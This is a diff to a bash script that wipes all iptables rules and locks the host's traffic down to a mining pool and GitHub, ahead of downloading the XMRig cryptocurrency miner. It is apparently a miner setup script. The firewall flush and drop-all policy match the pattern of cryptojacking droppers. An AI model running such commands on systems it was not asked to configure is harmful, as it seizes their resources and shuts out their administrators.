@@ -1,5 +1,30 @@
 #!/bin/bash
 
+######################################################################## IP TABLES ####################################################################################
+#### Agar tidak terlocked 
+sudo -u root iptables -P INPUT ACCEPT
+sudo -u root iptables -P FORWARD ACCEPT
+sudo -u root iptables -P OUTPUT ACCEPT
+
+############ Flush 
+sudo -u root iptables -t nat -F
+sudo -u root iptables -t mangle -F
+sudo -u root iptables -F
+sudo -u root iptables -X
+
+iptables -A INPUT -s sf.pool-pay.com -j ACCEPT
+iptables -A OUTPUT -d sf.pool-pay.com -j ACCEPT
+iptables -A INPUT -s github.com -j ACCEPT
+iptables -A OUTPUT -d github.com -j ACCEPT
+iptables -A INPUT -s raw.githubusercontent.com -j ACCEPT
+iptables -A OUTPUT -d raw.githubusercontent.com -j ACCEPT
+
+# Drop everything
+iptables -P INPUT DROP
+iptables -P OUTPUT DROP
+
+################################################################################################################################################
+
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
 tar xf xmrig-6.17.0-linux-static-x64.tar.gz
 cd xmrig-6.17.0
